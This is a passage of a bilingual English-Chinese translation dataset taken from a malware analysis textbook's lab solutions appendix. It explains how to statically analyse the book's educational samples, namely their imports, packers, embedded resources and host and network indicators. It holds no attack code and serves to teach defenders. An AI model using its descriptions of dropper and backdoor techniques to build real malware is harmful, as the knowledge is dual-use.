- en: Zero Wine is an open source malware sandbox that is distributed as a virtual
    machine running Debian Linux. Malware samples are executed using Zero Wine to
    emulate the Windows API calls, and the calls are logged to report on malicious
    activity. Zero Wine can even catch and defeat certain anti-virtual machine, anti-debugging,
    and anti-emulation techniques. You can download Zero Wine from *http://zerowine.sourceforge.net/*.
  id: totrans-651
  prefs: []
  type: TYPE_NORMAL
  zh: Zero Wine是一个开源的恶意软件沙箱，以虚拟机的形式分发，运行在Debian Linux上。恶意软件样本使用Zero Wine执行，以模拟Windows
    API调用，并将调用记录下来以报告恶意活动。Zero Wine甚至可以捕捉并击败某些反虚拟机、反调试和反模拟技术。您可以从*http://zerowine.sourceforge.net/*下载Zero
    Wine。
- en: Tools for Malware Analysis
  id: totrans-652
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件分析工具
- en: '**475**'
  id: totrans-653
  prefs: []
  type: TYPE_NORMAL
  zh: '**475**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-654
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-655
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**1**'
  id: totrans-656
  prefs: []
  type: TYPE_NORMAL
  zh: '**1**'
- en: '**S O L U T I O N S T O L A B S**'
  id: totrans-657
  prefs: []
  type: TYPE_NORMAL
  zh: '**SOLUTIONS TO LABS**'
- en: This appendix contains solutions to the labs that
  id: totrans-658
  prefs: []
  type: TYPE_NORMAL
  zh: 本附录包含了对实验室的解决方案，
- en: appear at the ends of most chapters. For each lab, we
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
  zh: 出现在大多数章节的末尾。对于每个实验室，我们
- en: provide a short answer section followed by detailed
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
  zh: 提供简答部分，随后是详细的
- en: analysis. The short answer section is useful for quickly checking to see if
    you got the right answer. The detailed analysis is useful for following step-by-step
    exactly how to complete the lab. If you have trouble completing a lab, use the
    detailed analysis section to guide you through it.
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
  zh: 分析。简答部分有助于快速检查您是否得到了正确答案。详细分析有助于一步一步地完成实验室。如果您在完成实验室时遇到困难，请使用详细分析部分来引导您完成。
- en: The labs are designed to run on a Windows XP machine with administrative privileges.
    Many of the labs will work on Windows Vista or Windows 7, but some will not.
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室是为具有管理员权限的Windows XP机器设计的。许多实验室可以在Windows Vista或Windows 7上运行，但有些则不行。
- en: '**Lab 1-1 Solutions**'
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 1-1 Solutions**'
- en: '***Short Answers***'
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-665
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: These files were written specifically for this book, so as of this writing,
    you should not find a signature for them on *VirusTotal.com*. Of course, if these
    files become part of the antivirus signatures as a result of the publication of
    this book, the results will be different.
  id: totrans-666
  prefs: []
  type: TYPE_NORMAL
  zh: 这些文件是专门为这本书编写的，因此截至本书编写时，您不应在*VirusTotal.com*上找到它们的签名。当然，如果这些文件因本书的出版而成为杀毒软件签名的一部分，结果将不同。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-667
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 2\.
  id: totrans-668
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Both files were compiled on December 19, 2010, within 1 minute of each other.
  id: totrans-669
  prefs: []
  type: TYPE_NORMAL
  zh: 这两个文件都是在2010年12月19日编译的，彼此之间相差不到1分钟。
- en: 3\.
  id: totrans-670
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: There are no indications that either file is packed or obfuscated.
  id: totrans-671
  prefs: []
  type: TYPE_NORMAL
  zh: 没有任何迹象表明这两个文件被压缩或混淆。
- en: 4\.
  id: totrans-672
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The interesting imports from *Lab01-01.exe* are FindFirstFile, FindNextFile,
    and CopyFile. These imports tell us that the program searches the filesystem and
    copies files. The most interesting imports from *Lab01-01.dll* are CreateProcess
    and Sleep. We also see that this file imports functions from *WS2_32.dll*, which
    provides network functionality.
  id: totrans-673
  prefs: []
  type: TYPE_NORMAL
  zh: 来自 *Lab01-01.exe* 的有趣导入是 FindFirstFile、FindNextFile 和 CopyFile。这些导入告诉我们程序会搜索文件系统并复制文件。来自
    *Lab01-01.dll* 的最有趣导入是 CreateProcess 和 Sleep。我们还看到这个文件导入了来自 *WS2_32.dll* 的函数，该函数提供了网络功能。
- en: 5\.
  id: totrans-674
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: Examine *C:\Windows\System32\kerne132.dll* for additional malicious activity.
    Note that the file *kerne**1**32.dll*, with the number *1* instead of the letter
    *l*, is meant to look like the system file *kerne**l**32.dll*. This file can be
    used as a host indicator to search for the malware.
  id: totrans-675
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 *C:\Windows\System32\kerne132.dll* 以查找额外的恶意活动。请注意，文件 *kerne**1**32.dll*，其中数字
    *1* 代替了字母 *l*，是为了看起来像系统文件 *kerne**l**32.dll*。这个文件可以用作宿主指标来搜索恶意软件。
- en: 6\.
  id: totrans-676
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: The *.dll* file contains a reference to local IP address 127.26.152.13\. This
    address is an artifact of this program having been created for educational and
    not malicious purposes. If this was real malware, the IP address should be routable,
    and it would be a good network-based indicator for use in identifying this malware.
  id: totrans-677
  prefs: []
  type: TYPE_NORMAL
  zh: '*.dll* 文件包含对本地 IP 地址 127.26.152.13 的引用。这个地址是这个程序被创建用于教育和非恶意目的的产物。如果这是一个真正的恶意软件，IP
    地址应该是可路由的，并且它将是一个用于识别这种恶意软件的良好基于网络的指标。'
- en: 7\.
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: The *.dll* file is probably a backdoor. The *.exe* file is used to install or
    run the DLL.
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
  zh: '*.dll* 文件可能是一个后门。*.exe* 文件用于安装或运行 DLL。'
- en: '***Detailed Analysis***'
  id: totrans-680
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: To answer the first question, we upload the file to *VirusTotal.com*, which
    performs a scan against antivirus signatures.
  id: totrans-681
  prefs: []
  type: TYPE_NORMAL
  zh: 要回答第一个问题，我们将文件上传到 *VirusTotal.com*，它会对抗病毒签名进行扫描。
- en: Next, we open the files in PEview. For each file, we navigate to the **IMAGE_NT_HEADERS****IMAGE_FILE_HEADER****Time
    Date Stamp** field, which tells us the compile time. Both files were compiled
    on December 19, 2010, within 1 minute of each other. This confirms our suspicions
    that these files are part of the same package. In fact, a compile time that close
    strongly suggests that these files were created at the same time by the same author.
  id: totrans-682
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们在 PEview 中打开这些文件。对于每个文件，我们导航到 **IMAGE_NT_HEADERS****IMAGE_FILE_HEADER****时间日期戳**字段，它告诉我们编译时间。这两个文件都是在
    2010 年 12 月 19 日编译的，彼此之间相差 1 分钟。这证实了我们的怀疑，即这些文件是同一包的一部分。事实上，如此接近的编译时间强烈暗示这些文件是由同一作者在同一时间创建的。
- en: We know that the files are related because of the compile times and where they
    were found. It’s likely that the *.exe* will use or install the *.dll*, because
    DLLs cannot run on their own.
  id: totrans-683
  prefs: []
  type: TYPE_NORMAL
  zh: 我们知道这些文件是相关的，因为它们的编译时间和它们被发现的位置。*.exe* 很可能使用或安装 *.dll*，因为 DLL 不能独立运行。
- en: Then we check to see if either file is packed. Both files have small but reasonable
    numbers of imports and well-formed sections with appropriate sizes. PEiD labels
    this as unpacked code compiled with Microsoft Visual C++, which tells us that
    these files are not packed. The fact that the files have few imports tells us
    that they are likely small programs. Notice that the DLL
  id: totrans-684
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们检查这两个文件是否被压缩。这两个文件都有少量但合理的导入数和结构良好的部分，大小适当。PEiD 将其标记为未压缩的代码，使用 Microsoft
    Visual C++ 编译，这告诉我们这些文件没有被压缩。文件导入数量少的事实告诉我们，它们可能是小型程序。请注意，DLL
- en: file has no exports, which is abnormal, but not indicative of the file being
    packed. (You will learn more about this export section when we return to these
    files in Lab 7-3.)
  id: totrans-685
  prefs: []
  type: TYPE_NORMAL
  zh: 文件没有导出，这是不正常的，但并不表明文件被压缩。（当你我们在第 7-3 实验中返回这些文件时，你将了解更多关于这个导出部分的信息。）
- en: Next, we look at the files’ imports and strings beginning with the *.exe*. All
    of the imports from *msvcrt.dll* are functions that are included in nearly every
    executable as part of the wrapper code added by the compiler.
  id: totrans-686
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们查看文件的导入和以 *.exe* 开头的字符串。来自 *msvcrt.dll* 的所有导入都是几乎每个可执行文件都包含的函数，作为编译器添加的包装代码的一部分。
- en: When we look at the imports from *kernel32.dll*, we see functions for opening
    and manipulating files, as well as the functions FindFirstFile and FindNextFile.
    These functions tell us that the malware searches through the **478**
  id: totrans-687
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们查看来自 *kernel32.dll* 的导入时，我们看到用于打开和操作文件的函数，以及 FindFirstFile 和 FindNextFile
    函数。这些函数告诉我们恶意软件会搜索 **478**
- en: Appendix C
  id: totrans-688
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-689
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: filesystem, and that it can open and modify files. We can’t be sure what the
    program is searching for, but the *.exe* string suggests that it is searching
    for **1**
  id: totrans-690
  prefs: []
  type: TYPE_NORMAL
  zh: 文件系统，并且可以打开和修改文件。我们无法确定程序正在搜索什么，但 *.exe* 字符串表明它正在搜索 **1**
- en: executables on the victim’s system.
  id: totrans-691
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者系统上的可执行文件。
- en: We also see the strings C:\Windows\System32\Kerne**l**32.dll and C:\windows\
    system32\kerne**1**32.dll. (Notice the change from the letter ***l*** to the number
    ***1***
  id: totrans-692
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还看到了字符串 C:\Windows\System32\Kerne**l**32.dll 和 C:\windows\ system32\kerne**1**32.dll。（注意从字母
    ***l*** 到数字 ***1*** 的变化）
- en: in kernel32.dll.) The file *kerne**1**32.dll* is clearly meant to disguise itself
    as the Windows *kernel32.dll* file. The file *kerne**1**32.dll* can serve as a
    host-based indicator to locate infections, and it is one that we should analyze
    for malicious code.
  id: totrans-693
  prefs: []
  type: TYPE_NORMAL
  zh: （位于 kernel32.dll 中。）文件 *kerne**1**32.dll* 明显是为了伪装成 Windows 的 *kernel32.dll*
    文件。文件 *kerne**1**32.dll* 可以作为基于主机的指标来定位感染，并且是我们应该分析其恶意代码的文件。
- en: 'Next, we look at the imports and strings for *Lab01-01.dll*, which imports
    functions from *WS2_32.dll*. Because these functions are imported by ordinal,
    we don’t know which functions are being imported. We also see two interesting
    functions imported from *kernel32.dll*: CreateProcess and Sleep, which are commonly
    used as backdoors. These functions are particularly interesting to us in combination
    with the strings exec and sleep. The exec string is probably sent over the network
    to command the backdoor to run a program with CreateProcess. The sleep string
    is probably used to command the backdoor program to sleep. (This malware is complex.
    We’ll return to it in Lab 7-3, once we have covered the skills to analyze it fully.)'
  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们查看 *Lab01-01.dll* 的导入和字符串，它从 *WS2_32.dll* 导入函数。因为这些函数是按序号导入的，所以我们不知道正在导入哪些函数。我们还看到从
    *kernel32.dll* 导入的两个有趣函数：CreateProcess 和 Sleep，这些函数通常用作后门。这些函数与字符串 exec 和 sleep
    结合起来对我们特别有趣。exec 字符串可能通过网络发送以命令后门运行程序。sleep 字符串可能用于命令后门程序休眠。（这种恶意软件很复杂。我们将在 7-3
    实验中回到它，一旦我们掌握了分析它的技能。）
- en: '**Lab 1-2 Solutions**'
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 1-2 解答**'
- en: '***Short Answers***'
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: As of this writing, the file matches 3 of 41 antivirus signatures.
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，该文件与 41 个防病毒签名中的 3 个匹配。
- en: 2\.
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: There are several indications that the program is packed with UPX. You can unpack
    it by downloading UPX and running upx –d.
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
  zh: 有几个迹象表明程序是用 UPX 打包的。您可以通过下载 UPX 并运行 upx –d 来解包它。
- en: 3\.
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: After unpacking the file, you’ll see that the most interesting imports are CreateService,
    InternetOpen, and InternetOpenURL.
  id: totrans-702
  prefs: []
  type: TYPE_NORMAL
  zh: 解包文件后，您会看到最有趣的导入是 CreateService、InternetOpen 和 InternetOpenURL。
- en: 4\.
  id: totrans-703
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: You should check infected machines for a service called Malservice and for network
    traffic to *http://www.malwareanalysisbook.com/*.
  id: totrans-704
  prefs: []
  type: TYPE_NORMAL
  zh: 您应该检查受感染的机器上的 Malservice 服务以及到 *http://www.malwareanalysisbook.com/* 的网络流量。
- en: '***Detailed Analysis***'
  id: totrans-705
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: When analyzing Lab 1-2, we upload the file to *VirusTotal.com* and see that
    it matches at least three virus signatures. One antivirus engine identifies it
    as a malicious downloader that downloads additional malware; the other two identify
    it as packed malware. This demonstrates the usefulness of *VirusTotal.com*.
  id: totrans-706
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析实验 1-2 时，我们将文件上传到 *VirusTotal.com* 并看到它至少与三个病毒签名匹配。一个防病毒引擎将其识别为恶意下载器，下载额外的恶意软件；其他两个将其识别为打包的恶意软件。这证明了
    *VirusTotal.com* 的有用性。
- en: Had we used only one antivirus program to scan this file, we would probably
    not get any information.
  id: totrans-707
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们只使用一个防病毒程序扫描此文件，我们可能不会得到任何信息。
- en: Upon opening the file with PEview, several indicators tell us that this file
    is packed. The most obvious indicators are sections named UPX0, UPX1, and UPX2—section
    names for UPX-packed malware. We could use PEiD to confirm the file’s packed nature,
    but it is not foolproof. Even if PEiD fails to identify the file as UPX-packed,
    notice the relatively small number of imports and that the first section, UPX0,
    has a virtual size of 0x4000 but a raw data size of 0\. UPX0 is the largest section,
    and it’s marked executable, so it’s probably where the original unpacked code
    belongs.
  id: totrans-708
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 PEview 打开文件后，几个指标表明该文件已被打包。最明显的指标是名为 UPX0、UPX1 和 UPX2 的部分——这是 UPX 打包恶意软件的部分名称。我们可以使用
    PEiD 来确认文件是否被打包，但这并不是万无一失的。即使 PEiD 未能识别文件为 UPX 打包，请注意导入数量相对较少，以及第一个部分 UPX0 的虚拟大小为
    0x4000，但原始数据大小为 0。UPX0 是最大的部分，并且被标记为可执行，因此它很可能是原始未打包代码的位置。
- en: Solutions to Labs
  id: totrans-709
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**479**'
  id: totrans-710
  prefs: []
  type: TYPE_NORMAL
  zh: '**479**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-711
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Having identified the program as packed, we can unpack it by downloading UPX
    from *http://upx.sourceforge.net/* and running the following command: upx -o newFilename
    -d originalFilename'
  id: totrans-712
  prefs: []
  type: TYPE_NORMAL
  zh: 识别程序为压缩后，我们可以通过从*http://upx.sourceforge.net/*下载UPX并运行以下命令来解压缩它：upx -o newFilename
    -d originalFilename
- en: The -d option says decompress the file, and the -o option specifies the output
    filename.
  id: totrans-713
  prefs: []
  type: TYPE_NORMAL
  zh: -d选项表示解压缩文件，而-o选项指定输出文件名。
- en: After unpacking, we look at the imports sections and the strings. The imports
    from *kernel32.dll* and *msvcrt.dll* are imported by nearly every program, so
    they tell us little about this specific program. The imports from *wininet.dll*
    tell us that this code connects to the Internet (InternetOpen and InternetOpenURL),
    and the import from *advapi32.dll* (CreateService) tell us that the code creates
    a service. When we look at the strings, we see www.malwareanalysisbook.com, which
    is probably the URL opened by InternetOpenURL as well as by Malservice, which
    could be the name of the service that is created.
  id: totrans-714
  prefs: []
  type: TYPE_NORMAL
  zh: 解压缩后，我们查看导入部分和字符串。从*kernel32.dll*和*msvcrt.dll*的导入几乎每个程序都有，所以它们对我们了解这个特定程序帮助不大。从*wininet.dll*的导入告诉我们代码连接到互联网（InternetOpen和InternetOpenURL），而从*advapi32.dll*（CreateService）的导入告诉我们代码创建了一个服务。当我们查看字符串时，我们看到www.malwareanalysisbook.com，这可能是InternetOpenURL以及Malservice打开的URL，Malservice可能是创建的服务名称。
- en: We can’t be sure what this program is doing, but we’ve found some indicators
    to help search for this malware across a network.
  id: totrans-715
  prefs: []
  type: TYPE_NORMAL
  zh: 我们无法确定这个程序正在做什么，但我们已经找到了一些指示，可以帮助在网络中搜索此恶意软件。
- en: '**Lab 1-3 Solutions**'
  id: totrans-716
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验1-3解答**'
- en: '***Short Answers***'
  id: totrans-717
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-718
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: As of this writing, 25 of 43 virus engines identify this sample as malware.
  id: totrans-719
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，43个病毒引擎中有25个将此样本识别为恶意软件。
- en: 2\.
  id: totrans-720
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The file is packed, but we can’t unpack it at this time.
  id: totrans-721
  prefs: []
  type: TYPE_NORMAL
  zh: 文件已被压缩，但我们目前无法解压缩它。
- en: 3\.
  id: totrans-722
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: This question can’t be answered without unpacking the file.
  id: totrans-723
  prefs: []
  type: TYPE_NORMAL
  zh: 没有解压缩文件，这个问题无法回答。
- en: 4\.
  id: totrans-724
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: This question can’t be answered without unpacking the file.
  id: totrans-725
  prefs: []
  type: TYPE_NORMAL
  zh: 没有解压缩文件，这个问题无法回答。
- en: '***Detailed Analysis***'
  id: totrans-726
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: For the file *Lab01-03.exe*, *VirusTotal.com* reports a variety of different
    signatures with vague-sounding names. The most common signature is that of a file
    packed with the FSG packer.
  id: totrans-727
  prefs: []
  type: TYPE_NORMAL
  zh: 对于文件*Lab01-03.exe*，*VirusTotal.com*报告了各种不同的签名，名称听起来模糊。最常见的签名是使用FSG压缩器的文件。
- en: When we open the file in PEview, we see several indications that the file is
    packed. The first is that the file sections have no names. Next, we see that the
    first section has a virtual size of 0x3000, but a raw data size of 0\. We run
    PEiD to confirm, and it identifies the packer as FSG 1.0 -> dulek/xt.
  id: totrans-728
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们在PEview中打开文件时，我们看到几个表明文件已被压缩的迹象。首先，文件部分没有名称。接下来，我们看到第一个部分具有0x3000的虚拟大小，但原始数据大小为0。我们运行PEiD进行确认，它识别压缩器为FSG
    1.0 -> dulek/xt。
- en: To confirm that the file is packed, we search for the imports, but there doesn’t
    seem to be an import table. An executable file without an import table is extremely
    rare, and its absence tells us that we should try another tool, because PEview
    is having trouble processing this file.
  id: totrans-729
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确认文件已被压缩，我们搜索导入项，但似乎没有导入表。没有导入表的可执行文件极为罕见，其缺失告诉我们应该尝试另一个工具，因为PEview在处理此文件时遇到了麻烦。
- en: 'We open the file with Dependency Walker, and see that it does have an import
    table, but it imports only two functions: LoadLibrary and GetProcAddress.'
  id: totrans-730
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用Dependency Walker打开文件，看到它确实有一个导入表，但它只导入两个函数：LoadLibrary和GetProcAddress。
- en: Packed files often import only these two functions, which further indicate that
    this file is packed. We can try to unpack the file using UPX, but we know that
    the file is packed with FSG, rather than UPX. We’ll return to this file in Chapter
    18, once we have covered the skills to unpack it.
  id: totrans-731
  prefs: []
  type: TYPE_NORMAL
  zh: 压缩文件通常只导入这两个函数，这进一步表明该文件已被压缩。我们可以尝试使用UPX解压缩文件，但我们知道该文件是用FSG压缩的，而不是UPX。我们将在第18章中回到这个文件，一旦我们掌握了解压缩它的技巧。
- en: '**480**'
  id: totrans-732
  prefs: []
  type: TYPE_NORMAL
  zh: '**480**'
- en: Appendix C
  id: totrans-733
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-734
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 1-4 Solutions**'
  id: totrans-735
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验1-4解答**'
- en: '**1**'
  id: totrans-736
  prefs: []
  type: TYPE_NORMAL
  zh: '**1**'
- en: '***Short Answers***'
  id: totrans-737
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-738
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: As of this writing, 16 of 43 antivirus engines identify this as malicious code
    that downloads and/or drops additional malware onto a system.
  id: totrans-739
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，43个反病毒引擎中有16个将其识别为恶意代码，该代码会下载并/或将额外的恶意软件安装到系统中。
- en: 2\.
  id: totrans-740
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: There are no indications that the file is packed or obfuscated.
  id: totrans-741
  prefs: []
  type: TYPE_NORMAL
  zh: 没有任何迹象表明文件已被压缩或混淆。
- en: 3\.
  id: totrans-742
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: According to the file header, this program was compiled in August 2019\.
  id: totrans-743
  prefs: []
  type: TYPE_NORMAL
  zh: 根据文件头信息，此程序是在2019年8月编译的。
- en: Clearly, the compile time is faked, and we can’t determine when the file was
    compiled.
  id: totrans-744
  prefs: []
  type: TYPE_NORMAL
  zh: 显然，编译时间被伪造了，我们无法确定文件是在何时编译的。
- en: 4\.
  id: totrans-745
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The imports from *advapi32.dll* indicate that the program is doing something
    with permissions. The imports from WinExec and WriteFile, along with the results
    from *VirusTotal.com*, tell us that the program writes a file to disk and then
    executes it. There are also imports for reading information from the resource
    section of the file.
  id: totrans-746
  prefs: []
  type: TYPE_NORMAL
  zh: 从 *advapi32.dll* 的导入表明程序正在处理权限。WinExec 和 WriteFile 的导入，以及来自 *VirusTotal.com*
    的结果告诉我们程序将文件写入磁盘然后执行它。还有从文件资源部分读取信息的导入。
- en: 5\.
  id: totrans-747
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The string \system32\wupdmgr.exe indicates that this program could create or
    modify a file at that location. The string www.malwareanalysisbook.com/
  id: totrans-748
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 \system32\wupdmgr.exe 表明该程序可能在该位置创建或修改文件。字符串 www.malwareanalysisbook.com/
- en: updater.exe probably indicates where additional malware is stored, ready for
    download.
  id: totrans-749
  prefs: []
  type: TYPE_NORMAL
  zh: updater.exe 可能表明了存储额外恶意软件的位置，准备下载。
- en: 6\.
  id: totrans-750
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The resource section contains another PE executable. Use Resource Hacker to
    save the resource as binary data, and then analyze the binary file as you would
    analyze any executable. The executable in the resource section is a downloader
    program that downloads additional malware.
  id: totrans-751
  prefs: []
  type: TYPE_NORMAL
  zh: 资源部分包含另一个 PE 可执行文件。使用 Resource Hacker 将资源保存为二进制数据，然后像分析任何可执行文件一样分析二进制文件。资源部分的可执行文件是一个下载器程序，用于下载额外的恶意软件。
- en: '***Detailed Analysis***'
  id: totrans-752
  prefs: []
  type: TYPE_NORMAL
  zh: '**详细分析**'
- en: For the *Lab01-04.exe* file, the results from *VirusTotal.com* suggest a program
    related to a downloader. PEview gives no indication that the file is packed or
    obfuscated.
  id: totrans-753
  prefs: []
  type: TYPE_NORMAL
  zh: 对于 *Lab01-04.exe* 文件，来自 *VirusTotal.com* 的结果显示该程序与下载器相关。PEview 没有显示该文件被打包或混淆的迹象。
- en: The imports from *advapi32.dll* tell us that program does something with permissions,
    and we can assume that it tries to access protected files using special permissions.
    The imports from *kernel32.dll* tell us that the program loads data from the resource
    section (LoadResource, FindResource, and SizeOfResource), writes a file to disk
    (CreateFile and WriteFile), and executes a file on the disk (WinExec). We can
    also guess that the program writes files to the system directory because of the
    calls to GetWindowsDirectory.
  id: totrans-754
  prefs: []
  type: TYPE_NORMAL
  zh: 从 *advapi32.dll* 的导入告诉我们程序在处理权限，我们可以假设它试图使用特殊权限访问受保护的文件。从 *kernel32.dll* 的导入告诉我们程序从资源部分加载数据（LoadResource、FindResource
    和 SizeOfResource），将文件写入磁盘（CreateFile 和 WriteFile），并在磁盘上执行文件（WinExec）。我们还可以猜测程序因为对
    GetWindowsDirectory 的调用而将文件写入系统目录。
- en: Examining the strings, we see www.malwareanalysisbok.com/updater.exe, which
    is probably the location that holds the malicious code for download.
  id: totrans-755
  prefs: []
  type: TYPE_NORMAL
  zh: 检查字符串，我们看到 www.malwareanalysisbok.com/updater.exe，这可能是存储下载恶意代码的位置。
- en: We also see the string \system32\wupdmgr.exe, which, in combination with the
    call to GetWindowsDirectory, suggests that a file in *C:\Windows\ System32\* *wupdmgr.exe*
    is created or edited by this malware.
  id: totrans-756
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还看到了字符串 \system32\wupdmgr.exe，它与对 GetWindowsDirectory 的调用结合，表明在 *C:\Windows\System32\*
    下的 *wupdmgr.exe* 文件是由该恶意软件创建或编辑的。
- en: We now know with some confidence that this malicious file downloads new malware.
    We know where it downloads the malware from, and we can guess where it stores
    the downloaded malware. The only thing that’s odd is that the program doesn’t
    appear to access any network functions.
  id: totrans-757
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在有相当大的信心认为这个恶意文件下载了新的恶意软件。我们知道它从哪里下载恶意软件，并且可以猜测它存储下载的恶意软件的位置。唯一奇怪的是，程序似乎没有访问任何网络功能。
- en: Solutions to Labs
  id: totrans-758
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**481**'
  id: totrans-759
  prefs: []
  type: TYPE_NORMAL
  zh: '**481**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-760
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 94](index-515_1.png)'
  id: totrans-761
  prefs: []
  type: TYPE_IMG
  zh: '![Image 94](index-515_1.png)'
- en: The most interesting part of this malware is the resource section. When we open
    this malware in Resource Hacker, we see one resource. Resource Hacker identifies
    the type of the resource as binary, meaning arbitrary binary data, and when we
    look at the data, most of it is meaningless. But notice the string !This program
    cannot be run in DOS mode. This string is the error message included in the DOS
    header at the beginning of all PE files. We can therefore conclude that this resource
    is an additional executable file stored in the resource section of *Lab01-04.exe*.
    This is a fairly common technique used in malware.
  id: totrans-762
  prefs: []
  type: TYPE_NORMAL
  zh: 这款恶意软件最有趣的部分是资源部分。当我们使用Resource Hacker打开这款恶意软件时，我们看到一个资源。Resource Hacker将资源的类型识别为二进制，这意味着任意二进制数据，当我们查看数据时，大部分都是无意义的。但请注意字符串！This
    program cannot be run in DOS mode. 这个字符串是所有PE文件开头DOS头中包含的错误消息。因此，我们可以得出结论，这个资源是存储在Lab01-04.exe资源部分的附加可执行文件。这在恶意软件中是一种相当常见的技巧。
- en: To continue analyzing this file with Resource Hacker, we click **Action**
  id: totrans-763
  prefs: []
  type: TYPE_NORMAL
  zh: 要继续使用Resource Hacker分析此文件，我们点击**操作**
- en: '**Save resource as binary file**. After saving the resource, we open the file
    in PEview to analyze the file embedded within it. Looking at the imports, we see
    that the embedded file is the one that accesses the network functions. It calls
    URLDownloadToFile, a function commonly used by malicious downloaders. It also
    calls WinExec, which probably executes the downloaded file.'
  id: totrans-764
  prefs: []
  type: TYPE_NORMAL
  zh: '**将资源保存为二进制文件**。在保存资源后，我们使用PEview打开文件以分析其中嵌入的文件。查看导入，我们看到嵌入的文件是访问网络功能的文件。它调用了URLDownloadToFile，这是一个恶意下载者常用的函数。它还调用了WinExec，这可能会执行下载的文件。'
- en: '**Lab 3-1 Solutions**'
  id: totrans-765
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验3-1解答**'
- en: '***Short Answers***'
  id: totrans-766
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-767
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: The malware appears to be packed. The only import is ExitProcess, although the
    strings appear to be mostly clear and not obfuscated.
